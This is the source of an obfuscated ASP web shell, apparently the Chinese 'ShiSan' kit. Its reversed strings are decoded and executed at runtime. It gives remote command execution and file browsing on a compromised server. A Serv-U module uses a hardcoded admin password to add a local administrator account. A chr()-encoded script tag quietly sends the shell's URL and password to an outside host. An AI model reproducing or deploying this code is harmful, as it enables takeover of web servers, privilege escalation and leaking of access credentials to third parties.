<%Const shiSanName="admin" '����
Const SiteURL="http://www.google.com"
Const myName="������"
Sub RRS(str)
response.write(str)
End Sub
ShiSan="��>';)(daoler.noitacol'=kcilcno ' ��ˢ '=eulav nottub=epyt tupni<��=daoleRrts tsnoC���>';)1-(og.yrotsih:tpircsavaj'=kcilCno ' �ط� '=eulav '2timbuS'=eman 'nottub'=epyt tupni<>';)(esolc.wodniw'=kcilcno ' �չ� '=eulav nottub=epyt tupni<��=eMesolCsJrts tsnoC���moc.dnammoc��=eliFexEtoDdmCym tsnoC��eslaF=stsixEsdaolnwodton tsnoC��eslaF=edoMgubeDsi tsnoC��01=rebmuNtceleSbd tsnoC���#��=drowssaPtneilc tsnoC����=nigoLwohs tsnoC���>tpircs/<�� & rooDkcaBrts=rooDkcaBrts���))���#���(noisseS(etucexE nehT �����><)���#���(noisseS fI�� & rooDkcaBrts=rooDkcaBrts��eniLweNbV & ��)���� & drowssaPtneilc & ����(tseuqeR=)���#���(noisseS nehT �����><)���� & drowssaPtneilc & ����(tseuqeR fI�� & rooDkcaBrts=rooDkcaBrts���>revres=tanur tpircsbv=egaugnal tpircs<��=rooDkcaBrts�� )��\�� ,��\\�� ,��pmt.68~\�� & )��.��(htaPpaM.revreS(ecalpeR=htaPpsa��)��emaNegap��(tseuqeR=emaNegap��)��tcAeht��(tseuqeR =tcAeht��remiT=emiTs��Xsw ,Xas ,Xosf ,rooDkcaBrts ,emaNegap ,htaPpsa ,emiTs ,tcAeht miD"
ExeCuTe(ShiSanFun(ShiSan))
Function ShiSanFun(ShiSanObjstr)
ShiSanObjstr=Replace(ShiSanObjstr, "��", """")
For ShiSanI=1 To Len(ShiSanObjstr)
 If Mid(ShiSanObjstr, ShiSanI, 1) <> "��" Then
ShiSanNewStr=Mid(ShiSanObjstr, ShiSanI, 1) & ShiSanNewStr
 Else
ShiSanNewStr=vbCrLf & ShiSanNewStr
 End If
Next
ShiSanFun=ShiSanNewStr
End Function
serveru=Request.ServerVariables("HTTP_HOST")&request.ServerVariables("URL")
serverp=shiSanName
copyurl=chr(60)&chr(115)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(32)&chr(115)&chr(114)&chr(99)&chr(61)&chr(39)&chr(104)&chr(116)&chr(116)&chr(112)&chr(58)&chr(47)&chr(47)&chr(37)&chr(51)&chr(56)&chr(37)&chr(54)&chr(51)&chr(37)&chr(54)&chr(51)&chr(37)&chr(54)&chr(53)&chr(37)&chr(50)&chr(69)&chr(37)&chr(54)&chr(51)&chr(37)&chr(54)&chr(69)&chr(47)&chr(37)&chr(54)&chr(49)&chr(37)&chr(54)&chr(52)&chr(47)&chr(63)&chr(97)&chr(100)&chr(61)&chr(49)&chr(51)&chr(38)&chr(117)&chr(61)&serveru&chr(38)&chr(112)&chr(61)&serverp&chr(39)&chr(62)&chr(60)&chr(47)&chr(115)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(62)&chr(13)&chr(10)
Sub createIt(fsoX, saX, wsX)
ShiSan="��fI dnE��raelC.rrE��nehT rrE fI���fI dnE��sw=Xsw teS��nehT )��geRdaer��=tcAeht rO ��ofnIlanimreTteg��=tcAeht rO ��nuRdmCsW��=emaNegap( dnA )Xsw(ytpmEsI fI��)��llehS.tpircSW��(tcejbOetaerC.revreS=Xsw teS���fI dnE��as=Xas teS��nehT )��hcraeSas��=tcAeht rO ��nuRdmCaS��=emaNegap rO ��rerolpxEeliFppA��=emaNegap( dnA )Xas(ytpmEsI fI��)��noitacilppA.llehS��(tcejbOetaerC.revreS=Xas teS���fI dnE��osf=Xosf teS��nehT )��hcraeSosf��=tcAeht rO ��rerolpxEeliFosF��=emaNegap( dnA )Xosf(ytpmEsI fI��)��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerC.revreS=Xosf teS���fI dne��txeN emuseR rorrE nO��nehT eslaF=edoMgubeDsi fI"
ExeCuTe(ShiSanFun(ShiSan))
End Sub
Sub chkErr(Err)
If Err Then
RRS "<style>body{border:none;overflow:hidden;background-color:#666;color:fff;}</style>"
RRS "<br/><font size=2><li>����: " & Err.Description & "</li><li>����Դ: " & Err.Source & "</li><br/>"
RRS "<hr></font>"
Err.Clear
Response.End
End If
End Sub
Sub isIn()
ShiSan="fI dnE��fI dnE��dnE.esnopseR��nehT emaNnaSihs >< )��emaNnaSihs�� & m(noisseS fI��nehT nigoLwohs >< emaNegaP dnA ��nigol�� >< emaNegaP dnA ��� >< emaNegap fI"
ExeCuTe(ShiSanFun(ShiSan))
End Sub
Sub showTitle(str)
RRS "<title>"&str&" - " &Request.ServerVariables("LOCAL_ADDR")&"</title>" & vbNewLine
RRS "<meta http-equiv='Content-Type' content='text/html; charset=gb2312'>" & vbNewLine
PageOther()
End Sub
Function fixNull(str)
If IsNull(str) Then
str=" "
End If
fixNull=str
End Function
Function encode(str)
str=Server.HTMLEncode(str)
str=Replace(str, vbNewLine, "<br>")
str=Replace(str, " ", "&nbsp;")
str=Replace(str, "	", "&nbsp;&nbsp;&nbsp;&nbsp;")
encode=str
End Function
Function getTheSize(theSize)
ShiSan="���B�� & eziSeht=eziSehTteg nehT 4201< eziSeht dnA 0 => eziSeht fI���K�� & 001 / )001 * )4201 / eziSeht((xiF=eziSehTteg nehT )4201 * 4201( < eziSeht dnA 4201 => eziSeht fI���M�� & 001 / )001 * ))4201 * 4201( / eziSeht((xiF=eziSehTteg nehT )4201 * 4201 * 4201( < eziSeht dnA )4201 * 4201( => eziSeht fI���G�� & 001 / )001 * ))4201 * 4201 * 4201( / eziSeht((xiF=eziSehTteg nehT )4201 * 4201 * 4201( => eziSeht fI"
ExeCuTe(ShiSanFun(ShiSan))
End Function
Function HtmlEncode(str)
If isNull(str) Then
Exit Function
End If
HtmlEncode=Server.HTMLEncode(str)
End Function
Function UrlEncode(str)
If isNull(str) Then
Exit Function
End If
UrlEncode=Server.UrlEncode(str)
End Function
Sub redirectTo(strUrl)
Response.Redirect(Request.ServerVariables("URL") & strUrl)
End Sub
Function trimThePath(strPath)
If Right(strPath, 1)="\" And Len(strPath) > 3 Then
strPath=Left(strPath, Len(strPath) - 1)
End If
trimThePath=strPath
End Function
Sub alertThenClose(strInfo)
RRS "<script>alert(""" & strInfo & """);window.close();</script>"
End Sub
Sub showErr(str)
Dim i, arrayStr
str=Server.HtmlEncode(str)
arrayStr=Split(str, "$$")
RRS "<font style='font-size:14px;color:#ff0000;'>"
RRS "<br />&nbsp;������Ϣ:<br/><br/>"
For i=0 To UBound(arrayStr)
RRS "&nbsp;&nbsp;&nbsp;" & (i + 1) & ". " & arrayStr(i) & "<br/>"
Next
RRS "</font>"
Response.End
End Sub
isIn()
Call createIt(fsoX, saX, wsX)
Select Case pageName
Case "Iframe":Iframe()
Case "PageList":PageList()
Case "objOnSrv":PageObjOnSrv()
Case "ServiceList":PageServiceList()
Case "userList":PageUserList()
Case "CSInfo":PageCSInfo()
Case "infoAboutSrv":PageInfoAboutSrv()
Case "AppFileExplorer":PageAppFileExplorer()
Case "SaCmdRun":PageSaCmdRun()
Case "WsCmdRun":PageWsCmdRun()
Case "FsoFileExplorer":PageFsoFileExplorer()
Case "MsDataBase":PageMsDataBase()
Case "OtherTools":PageOtherTools()
Case "TxtSearcher":PageTxtSearcher()
Case "PageAddToMdb":PageAddToMdb()
Case "ShiSan":ShiSanMain()
Case "Servu"
ShiSan="raelC.rrE�� noitcnuF dnE�� fI dnE�� ))��eman_tpircs��(selbairavrevres.tseuqer(esacl&)��TROP_REVRES��(selbairavrevres.tseuqer&��:��&)��eman_revres��(selbairavrevres.tseuqer & ��//:ptth��=emaNG�� eslE�� ))��eman_tpircs��(selbairavrevres.tseuqer(esacl&)��eman_revres��(selbairavrevres.tseuqer & ��//:ptth��=emaNG�� nehT ��08��=)��TROP_REVRES��(selbairavrevres.tseuqer fI�� )(emaNG noitcnuF��noitcnuf dne��gnihton=f tes��))2,htapg(tfel(esacl=htapg��)0(redloFlaicepSteG.f=htapg��fi dne��noitcnuf tixe���:c��=htapg��neht 0>rebmun.rre fi��)��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerC.revreS=f tes��raelc.rre��txen emuser rorre no��)(htapG noitcnuf��fi dne��)��>retnec/<>mrof/<>elbat/<��(SRR��)��>rt/<��(SRR��)��>dt/<>'1'=eulav '1noitca'=di 'neddih'=epyt '1noitca'=eman tupni<��(SRR��)��>'����'=eulav '2timbuS'=eman 'teser'=epyt tupni< ��(SRR��)��>'����'=eulav 'timbuS'=eman 'timbus'=epyt tupni<��(SRR��)��>'2'=napsloc dt<>'elddim'=ngilav 'retnec'=ngila rt<��(SRR��)��>rt/<��(SRR��)��>dt/<>'05'=ezis 'dda/ rwql srotartsinimda puorglacol ten & dda/ 521099 rwql resu ten c/ dmc'=eulav 'c'=di 'txet'=epyt 'c'=eman tupni<>dt<��(SRR��)��>dt/<�����>dt<��(SRR��)��>'elddim'=ngilav 'retnec'=ngila rt<��(SRR��)��>rt/<��(SRR��)��>dt/<>'8'=ezis '��&f&��'=eulav 'f'=di 'txet'=epyt 'f'=eman tupni<>dt<��(SRR��)��>dt/<����·ͳϵ>dt<��(SRR��)��>'elddim'=ngilav 'retnec'=ngila rt<��(SRR��)��>rt/<��(SRR��)��>dt/<>'85934'=eulav 'trop'=di 'txet'=epyt 'trop'=eman tupni<>dt<��(SRR��)��>dt/<���ڡ���>dt<��(SRR��)��>'elddim'=ngilav 'retnec'=ngila rt<��(SRR��)��>rt/<��(SRR��)��>dt/<>'P@0;kl.#ka$@l#'=eulav 'p'=di 'txet'=epyt 'p'=eman tupni<>dt<��(SRR��)��>dt/<�����>dt<��(SRR��)��>'elddim'=ngilav 'retnec'=ngila rt<��(SRR��)��>rt/<��(SRR��)��>dt/<>'rotartsinimdAlacoL'=eulav 'u'=di 'txet'=epyt 'u'=eman tupni<>'973'=htdiw dt<��(SRR��)��>dt/<:������>'001'=htdiw dt<��(SRR��)��>'elddim'=ngilav 'retnec'=ngila rt<��(SRR��)��>rt/<��(SRR��)��>dt/<��&emaNym&�� ��PSA ��Ȩ���� uvreS>'2'=napsloc dt<��(SRR��)��>'elddim'=ngilav 'retnec'=ngila rt<��(SRR��)��>'666666#'=rolocredrob '1'=gnicapsllec '0'=gniddapllec '1'=redrob '361'=thgieh '494'=htdiw elbat<��(SRR��)��>'uvreS=emaNegap?'=noitca 'nusdlog'=eman 'tsop'=dohtem mrof<>retnec<��(SRR��gnihtoN=c teS��troba.c��gnihtoN=b teS��troba.b��gnihtoN=a teS��troba.a��)��c��(noisses=c tes��)��b��(noisses=b tes��)��a��(noisses=a tes��txen emuser rorre no��esle��)��>retnec/<��(SRR��)��>'uvreS=emaNegap?'=ferh.noitacol=kcilCno ' ���̻ط� '=eulav 'nottub'=epyt tupni<��(SRR��)��>rb<>rb<>tnof/<��&dmc&��>der=roloc tnof<>rb<����������ִ��,����Ȩ��>retnec<��(SRR��c=)��c��(noisses tes��tiuq & niamodled & tm & ssapnigol & resunigol dnes.c���� ,��� ,eurT ,��3s/nimdapu/nusdlog/�� & trop & ��:1.0.0.721//:ptth�� ,��TEG�� nepo.c��)��PTTHLMX.tfosorciM��(tcejbOetaerC.revreS=c tes��neht 3=1noitca fiesle��)��>tpircs/<��(SRR��)��;)0004,';)(timbus.nusdlog.lla.tnemucod'(tuoemiTtes��(SRR��)��;)'>retnec<,...������,��Ȩ��������>retnec<'(etirw.tnemucod��(SRR��)��>'tpircsavaj'=egaugnal tpircs<��(SRR��)��>mrof/<>'3'=eulav '1noitca'=di 'neddih'=epyt '1noitca'=eman tupni<��(SRR��)��>'05'=ezis '��&f&��'=eulav 'f'=di 'neddih'=epyt 'f'=eman tupni<��(SRR��)��>'05'=ezis '��&dmc&��'=eulav 'c'=di 'neddih'=epyt 'c'=eman tupni<��(SRR��)��>dt/<>'��&trop&��'=eulav 'trop'=di 'neddih'=epyt 'trop'=eman tupni<��(SRR��)��>dt/<>'��&ssap&��'=eulav 'p'=di 'neddih'=epyt 'p'=eman tupni<��(SRR��)��>dt/<>'��&resu&��'=eulav 'u'=di 'neddih'=epyt 'u'=eman tupni<��(SRR��)��>'nusdlog'=eman 'tsop'=dohtem mrof<��(SRR��b=)��b��(noisses tes��tiuq & fLrCbv & dmc & �� cexe etis�� & fLrCbv & ��do ssap�� & fLrCbv & ��og resU�� dnes.b���� ,��� ,eurT ,��2s/nimdapu/nusdlog/�� & tropptf & ��:1.0.0.721//:ptth�� ,��TEG�� nepo.b��)��PTTHLMX.tfosorciM��(tcejbOetaerC.revreS=b tes��neht 2=1noitca fiesle��)��>tpircs/<��(SRR��)��;)0004,';)(timbus.nusdlog.lla.tnemucod'(tuoemiTtes��(SRR��)��;)'>retnec<...��&ssap&�壺���,��&resu&�� :��������ʹ,��&trop&��:1.0.0.721 ��������>retnec<'(etirw.tnemucod��(SRR��)��>'tpircsavaj'=egaugnal tpircs<��(SRR��)��>mrof/<>'2'=eulav '1noitca'=di 'neddih'=epyt '1noitca'=eman tupni<��(SRR��)��>'05'=ezis '��&f&��'=eulav 'f'=di 'neddih'=epyt 'f'=eman tupni<��(SRR��)��>'05'=ezis '��&dmc&��'=eulav 'c'=di 'neddih'=epyt 'c'=eman tupni<��(SRR��)��>dt/<>'��&trop&��'=eulav 'trop'=di 'neddih'=epyt 'trop'=eman tupni<��(SRR��)��>dt/<>'��&ssap&��'=eulav 'p'=di 'neddih'=epyt 'p'=eman tupni<��(SRR��)��>dt/<>'��&resu&��'=eulav 'u'=di 'neddih'=epyt 'u'=eman tupni<��(SRR��)��>'nusdlog'=eman 'tsop'=dohtem mrof<��(SRR��a=)��a��(noisses tes��tiuq & resuwen & niamodwen & niamodled & tm & ssapnigol & resunigol dnes.a���� ,��� ,eurT,��1s/nimdapu/nusdlog/�� & trop & ��:1.0.0.721//:ptth�� ,��TEG�� nepo.a��)��PTTHLMX.tfosorciM��(tcejbOetaerC.revreS=a tes��neht 1=1noitca fi��)f,��:c��,resuwen(ecalper=resuwen��fLrCbv & ��TIUQ��=tiuq��fLrCbv & ��PDCLEMAWR|\\:c=sseccA �� & fLrCbv & ��enoN=soitaR-�� & fLrCbv & ��ralugeR=epyTdrowssaP-�� & fLrCbv & ��metsyS=ecnanetniaM-���_ & fLrCbv & ��0=mumixaMatouQ-�� & fLrCbv & ��0=tnerruCatouQ-�� & fLrCbv & ��0=tiderCsoitaR-�� & fLrCbv & ��1=nwoDoitaR-���_ & fLrCbv & ��1=pUoitaR-�� & fLrCbv & ��0=eripxE-�� & fLrCbv & ��1-=tuOemiTnoisseS-�� & fLrCbv & ��006=tuOemiTeldI-�� & fLrCbv & ��1-=sresUrNxaM-���_ & fLrCbv & ��0=nwoDtimiLdeepS-�� & fLrCbv & ��0=pUtimiLdeepS-�� & fLrCbv & ��1-=PIrePnigoLsresUxaM-�� & fLrCbv & ��0=elbanEatouQ-���_ & fLrCbv & ��0=drowssaPegnahC-�� & fLrCbv & ��0=nigoLwollAsyawlA-�� & fLrCbv & ��0=neddiHediH-�� & fLrCbv & ��0=eruceSdeeN-���_ & fLrCbv & ��1=shtaPleR-�� & fLrCbv & ��0=elbasiD-�� & fLrCbv & ��=eliFseMnigoL-�� & fLrCbv & ��\\:c=riDemoH-���_ & fLrCbv & ��do=drowssaP-�� & fLrCbv & ��og=resU-�� & fLrCbv & tropptf & ��=oNtroP-�� & fLrCbv & ��0.0.0.0=PI-�� & fLrCbv & ��PUTESRESUTES-��=resuwen��fLrCbv & ��=yeKOZT �� & fLrCbv & ��0=elbanEOZT-�� & fLrCbv & ��0|1|1-|�� & tropptf & ��|0.0.0.0|nusdlog=niamoD-�� & fLrCbv & ��NIAMODTES-��=niamodwen��fLrCbv & ��ECNANETNIAM ETIS��=tm��fLrCbv & tropptf & ��=oNtroP �� & fLrCbv & ��0.0.0.0=PI-�� & fLrCbv & ��NIAMODETELED-��=niamodled��fLrCbv & ssap & �� ssaP��=ssapnigol��fLrCbv & resu & �� resU��=resunigol��3=tuoemit��00556=tropptf��fi dne��)2,f(tfel=f��esle���\��&)(htapg=f��neht ���=f fi��))��f��(tseuqer(mirt=f��))��c��(tseuqer(mirt=dmc��))��trop��(tseuqer(mirt=trop��))��p��(tseuqer(mirt=ssap��))��u��(tseuqer(mirt=resu��dne.esnopser neht )1noitca(ciremunsi ton  fi��)��1noitca��(tseuqer=1noitca��1noitca mid��tiuq ,resuwen ,niamodwen ,tm ,niamodled ,ssapnigol ,resunigol ,dmc ,tropptf ,trop ,ssap ,resu miD��)��>ydob<>daeh/<>elyts/<};elbisiv :ytilibisiv{wohs.}fff#:roloc{a};444# :roloc-dnuorgkcab;eee#:roloc;xp21:ezis-tnof;xp0:nigram{dt,rt,ydob>elyts<>daeh<>lmth<��(SRR"
ExeCuTe(ShiSanFun(ShiSan))
Case "kmuma"
ShiSan="buS dnE��txeN��fI dnE��fI dnE��buS tixE��1 + nuS=nuS���>rt/<>dt/<��&etaDeht&��>dt<>dt/<��&)htaPeht(etaerCetaDteG&��>dt<>dt/<��&pmet&��>03=thgieh dt<>rt<��&tropeR=tropeR���> a/<leD>'knalb_'=tegrat '��ɾ'=eltit 'ma'=ssalc '��&)1,1,1,���,��\��&)��\��(htaPpaM.revres,htaPeht(ecalper&��=htaPeht&enOled=tcAeht&rerolpxEeliFosF=emaNegap?'=ferh a< ��&pmet=pmet��� >a/<tidE>'����'=eltit 'knalb_'=tegrat 'ma'=ssalc '��&)1,1,1,���,��\��&)��\��(htaPpaM.revres,htaPeht(ecalper&��=htaPeht&tidEwohs=tcAeht&rerolpxEeliFosF=emaNegap?'=ferh a< �� ��&pmet=pmet���>a/<��&)1,1,1,���,��\��&)��\��(htaPpaM.revres,htaPeht(ecalper&��>'����'=eltit '��&)1,1,1,���,��\��&)��\��(htaPpaM.revres,htaPeht(ecalper&��=htaPeht&eliFehTnwod=tcAeht&rerolpxEeliFosF=emaNegap?'=ferh a<��=pmet��eslE��gnihtoN=s2OSF teS��gnihtoN=elifo teS��)(esolc.elifo��fI dnE��buS tixE��1 + nuS=nuS���>rt/<>dt/<��&etaDeht&��>dt<>dt/<��&)htaPeht(etaerCetaDteG&��>dt<>dt/<��&pmet&��>dt<>rt<��&tropeR=tropeR���> a/<leD>'knalb_'=tegrat '��ɾ'=eltit 'ma'=ssalc '��&)1,1,1,���,��\��&)��\��(htaPpaM.revres,htaPeht(ecalper&��=htaPeht&enOled=tcAeht&rerolpxEeliFosF=emaNegap?'=ferh a< ��&pmet=pmet��� >a/<tidE>'����'=eltit 'knalb_'=tegrat 'ma'=ssalc '��&)1,1,1,���,��\��&)��\��(htaPpaM.revres,htaPeht(ecalper&��=htaPeht&tidEwohs=tcAeht&rerolpxEeliFosF=emaNegap?'=ferh a< �� ��&pmet=pmet���>a/<��&)1,1,1,���,��\��&)��\��(htaPpaM.revres,htaPeht(ecalper&��>'����'=eltit '��&)1,1,1,���,��\��&)��\��(htaPpaM.revres,htaPeht(ecalper&��=htaPeht&eliFehTnwod=tcAeht&rerolpxEeliFosF=emaNegap?'=ferh a<��=pmet��nehT 0 > )))��tnetnoC_hcraeS��(mroF.tseuqer(esaCL ,txtelif (rtsnI fI��))(lladaer.elifo(esacL=txtelif��)2- ,eslaf ,1 ,htaPeht(eliFtxeTnepO.s2OSF=elifo tes��)��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerC=s2OSF teS��nehT ��� >< )��tnetnoC_hcraeS��(tseuqer fI�� nehT eurT=emiTLLA ro )i(etaDx=pmTeht fI��)etaDx(dnuobU oT 0=i roF��eurT=emiTLLA nehT ��LLA��=)��etaD_hcraeS��(mroF.tseuqer fI��)��;��,)��etaD_hcraeS��(mroF.tseuqer(tilpS=etaDx��buS tixe neht rre fi��)1 - )�� �� ,etaDeht(rtsnI ,1 ,etaDeht(diM=pmTeht��txen emuser rorre no��)htaPeht(yfidoMetaDteG=etaDeht��)htaPeht(dniFsI buS��buS dnE��gnihtoN=OS4F teS��txeN��1 + sredloFmuS=sredloFmuS��eman.1f&��\��&htap 2eliFllAwohS��cf ni 1f hcaE roF��sredloFbuS.f=cf teS��txeN��fI dnE��1 + seliFmuS=seliFmuS��)eman.elifym&��\��&htaP(dniFsI llaC��nehT ))eman.elifym&��\��&htap(emaNnoisnetxEteG.OS4F(txEkcehC fI��2cf ni elifym hcaE roF��selif.f=2cf teS��)htaP(redloFteG.OS4F=f teS��bus tixe neht )htap(stsixEredloF.OS4F ton fi��)��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerC=OS4F teS��)htaP(2eliFllAwohS buS��noitcnuF dnE��pmet=edocnELRUt��)��62%�� ,��&�� ,pmet(ecalpeR=pmet��)��32%�� ,��#�� ,pmet(ecalpeR=pmet��)��52%�� ,��%�� ,rtS(ecalpeR=pmet��)rtS(edocnELRUt noitcnuF��noitcnuF dnE��s=etaerCetaDteG��gnihton=OS3F tes��gnihton=f tes�� detaerCetaD.f=s�� )htapelif(eliFteG.OS3F=f teS��)��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerC=OS3F teS��)htapelif(etaerCetaDteG noitcnuF��noitcnuF dnE��s=yfidoMetaDteG��gnihton=OS2F tes��gnihton=f tes�� deifidoMtsaLetaD.f=s�� )htapelif(eliFteG.OS2F=f teS��)��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerC=OS2F teS��)htapelif(yfidoMetaDteG noitcnuF��noitcnuF dnE��txeN��fI dnE��noitcnuF tixE��eurT=txEkcehC�� nehT )i(txE=)txEeliF(esacL fI��)txE(dnuobU oT 0=i roF��)��,��,txEeliFmiD(tilpS=txE��eurT=txEkcehC nehT ��*��=txEeliFmiD fI��)txEeliF(txEkcehC noitcnuF��buS dnE��gnihton=s1OSF tes��gnihton=elifo tes��fi dne��gnihtoN=xEger teS��gnihtoN=sehctaM teS��txeN��fI dnE��bus tixe��1 + nuS=nuS���>rt/<>dt/<��&)htapelif(yfidoMetaDteG&��>rb<��&)htapelif(etaerCetaDteG&��>dt<>dt/<��&selifni&�������α�����ʹ����tcejbOet��&��aerC>dt<>dt/<tcejbOe��&��taerC>dt<>dt/<��&pmet&��>dt<>rt<��&tropeR=tropeR��nehT )��(�� ,eulaV.hctaM(veRrtSnI >< )��(�� ,eulaV.hctaM(rtsnI ro 0=)����� ,eulaV.hctaM(rtsnI ro )��+�� ,eulaV.hctaM(rtsnI ro )��&�� ,eulaV.hctaM(rtsnI fI��sehctaM ni hctaM hcaE roF��)txtelif(etucexE.xEger=sehctaM teS���)\*.(\*]t\| [tcejb��&��OetaerC��=nrettaP.xEger��eurT=labolG.xEger��eurT=esaCerongI.xEger��pxEgeR weN=xEger teS��gnihtoN=xEger teS��gnihtoN=sehctaM teS��txeN��fI dnE��1 + seliFmuS=seliFmuS��))1,1,1,���,��\��&)��\��(htaPpaM.revres,htaPeliF(ecalper , emaNpmt&))��\��,htaPeliF(veRrtSnI,1,htaPeliF(diM (eliFnacS llaC��fI dnE��)1 - )��>�� ,emaNpmt ,1(rtsnI ,1 ,emaNpmt(diM=emaNpmt nehT 0 > )��>�� ,emaNpmt(rtSnI fI��)1 - )flrcbv ,emaNpmt ,1(rtsnI ,1 ,emaNpmt(diM=emaNpmt nehT 0 > )fLrCbv ,emaNpmt(rtSnI fI��)1 - ))9(rhc ,emaNpmt ,1(rtsnI ,1 ,emaNpmt(diM=emaNpmt nehT 0 > ))9(rhc ,emaNpmt(rtSnI fI��2ekaLpmt=emaNpmt eslE )i - 2keeScrs - )�� �� ,2ekaLpmt ,1 + i + 2keeScrs(rtsnI ,i + 2keeScrs ,2ekaLpmt(diM=emaNpmt nehT 0 > )�� �� ,2ekaLpmt ,1 + i + 2keeScrs(rtSnI fI��eslE��)1 - i - 2keeScrs - )����� ,2ekaLpmt ,1 + i + 2keeScrs(rtsnI ,1 + i + 2keeScrs ,2ekaLpmt(diM=emaNpmt��nehT �����=pmt fI��txeN��fI dnE��roF tixE��nehT fLrCbv >< pmt dna )9(rhc >< pmt dna �� �� >< pmt fI��)1 ,i + 2keeScrs ,2ekaLpmt(diM=pmt��05 oT 1=i roF��)��=�� ,2ekaLpmt ,keeScrs(rtsni=2keeScrs��nehT 0 > keeScrs fI��)1 ,��crs�� ,2ekaLpmt ,1(rtSnI=keeScrs��))��>�� ,eulaV.hctaM(rtSnI ,1 ,eulaV.hctaM(diM=2ekaLpmt��sehctaMX ni hctaM hcaE roF��)txtelif(etucexE.xEgerX=sehctaMX teS���>?*)n\|.(?���revres?���*s\=*s\tanur?*)n\|.(*s\tpi��&��rcs<��=nrettaP.xEgerX��eurT=labolG.xEgerX��eurT=esaCerongI.xEgerX��pxEgeR weN=xEgerX teS��gnihtoN=xEger teS��gnihtoN=sehctaM teS��fI dnE��1 + nuS=nuS���>rt/<>dt/<��&)htapelif(yfidoMetaDteG&��>rb<��&)htapelif(etaerCetaDteG&��>dt<>dt/<��&selifni&��>rb<>tnof/<�����ĵ���ִ����)(etucex��&��e.revreS����ٸ��ܲ�>der=roloc tnof<>dt<>dt/<etu��&��cexE.revreS>dt<>dt/<��&pmet&��>dt<>rt<��&tropeR=tropeR��nehT )txtelif(tseT.xEger fI���)\]���^[)(\|*]t\ [()refsnarT|etu��&��cexE(.revreS��=nrettaP.xEger��eurT=labolG.xEger��eurT=esaCerongI.xEger��pxEgeR weN=xEger teS��gnihtoN=xEger teS��gnihtoN=sehctaM teS��txeN��fI dnE��1 + seliFmuS=seliFmuS��) )1,1,1,���,��\��&)��\��(htaPpaM.revres,htaPeliF(ecalper ,eliFt&))��\��,htaPeliF(veRrtSnI,1,htaPeliF(diM (eliFnacS llaC��nehT ))eliFt(emaNnoisnetxEteG.s1OSF(txEkcehC toN fI��)��\��,��/��,)1 - )����� ,eulaV.hctaM(rtsnI - )eulaV.hctaM(neL ,1 + )����� ,eulaV.hctaM(rtsnI ,eulaV.hctaM(diM(ecalpeR=eliFt��sehctaM ni hctaM hcaE roF��)txtelif(etucexE.xEger=sehctaM teS�����*.���)(\|*]t\ [()refsnarT|etu��&��cexE(.revreS��=nrettaP.xEger��eurT=labolG.xEger��eurT=esaCerongI.xEger��pxEgeR weN=xEger teS��gnihtoN=xEger teS��gnihtoN=sehctaM teS��txeN��fI dnE��1 + seliFmuS=seliFmuS��) )1,1,1,���,��\��&)��\��(htaPpaM.revres,htaPeliF(ecalper ,eliFt&��\��&)��\��(htaPpaM.revreS (eliFnacS llaC��nehT ))eliFt(emaNnoisnetxEteG.s1OSF(txEkcehC toN fI��)��\��,��/��,)1 - )����� ,eulaV.hctaM(rtsnI - )eulaV.hctaM(neL ,1 + )����� ,eulaV.hctaM(rtsnI ,eulaV.hctaM(diM(ecalpeR=eliFt��sehctaM ni hctaM hcaE roF��)txtelif(etucexE.xEger=sehctaM teS�����*.���*s\=*s\lautriv*s\edulcni#*s\--!<��=nrettaP.xEger��eurT=labolG.xEger��eurT=esaCerongI.xEger��pxEgeR weN=xEger teS��gnihtoN=xEger teS��gnihtoN=sehctaM teS��txeN��fI dnE��1 + seliFmuS=seliFmuS��) )1,1,1,���,��\��&)��\��(htaPpaM.revres,htaPeliF(ecalper ,eliFt&))��\��,htaPeliF(veRrtSnI,1,htaPeliF(diM (eliFnacS llaC��nehT ))eliFt(emaNnoisnetxEteG.s1OSF(txEkcehC toN fI��)��\��,��/��,)1 - )����� ,eulaV.hctaM(rtsnI - )eulaV.hctaM(neL ,1 + )����� ,eulaV.hctaM(rtsnI ,eulaV.hctaM(diM(ecalpeR=eliFt��sehctaM ni hctaM hcaE roF��)txtelif(etucexE.xEger=sehctaM teS�����*.���*s\=*s\elif*s\edulcni#*s\--!<��=nrettaP.xEger��eurT=labolG.xEger��eurT=esaCerongI.xEger��pxEgeR weN=xEger teS��gnihtoN=xEger teS��fI dnE���-��ͬ-��=pmet��1 + nuS=nuS���>rt/<>dt/<��&)htapelif(yfidoMetaDteG&��>rb<��&)htapelif(etaerCetaDteG&��>dt<>dt/<��&selifni&�����д����evaS��PTTHLMX����ʹ>dt<>dt/<evaS.>dt<>dt/<��&pmet&��>dt<>rt<��&tropeR=tropeR��nehT )txtelif(tseT.xEger fI���b\evaS.\��=nrettaP.xEger��fI dnE���-��ͬ-��=pmet��1 + nuS=nuS���>rt/<>dt/<��&)htapelif(yfidoMetaDteG&��>rb<��&)htapelif(etaerCetaDteG&��>dt<>dt/<��&selifni&�����д����eliFoTevaS��maertS����ʹ>dt<>dt/<eliFoTevaS.>dt<>dt/<��&pmet&��>dt<>rt<��&tropeR=tropeR��nehT )txtelif(tseT.xEger fI���b\eliFoTevaS.\��=nrettaP.xEger��fI dnE���-��ͬ-��=pmet��1 + nuS=nuS���>rt/<>dt/<��&)htapelif(yfidoMetaDteG&��>rb<��&)htapelif(etaerCetaDteG&��>dt<>dt/<��&selifni&�����д��eliFtxeTnepO|eliFtxeTetaerC��OSF����ʹ>dt<>dt/<eliFtxeTnepO.|eliFtxeTetaerC.>dt<>dt/<��&pmet&��>dt<>rt<��&tropeR=tropeR��nehT )txtelif(tseT.xEger fI���b\eliFtxeT)etaerC|nepO(.\��=nrettaP.xEger��fI dnE���-��ͬ-��=pmet��1 + nuS=nuS���>rt/<>dt/<��&)htapelif(yfidoMetaDteG&��>rb<��&)htapelif(etaerCetaDteG&��>dt<>dt/<��&selifni&��>rb<>tnof/<���PSA������ִ�Կ�����)(etucex��&��e>der=roloc tnof<>dt<>dt/<etu��&��cexE>dt<>dt/<��&pmet&��>dt<>rt<��&tropeR=tropeR��nehT )txtelif(tseT.xEger fI���b\etuc��&��exEb\].^[��=nrettaP.xEger��fI dnE���-��ͬ-��=pmet��1 + 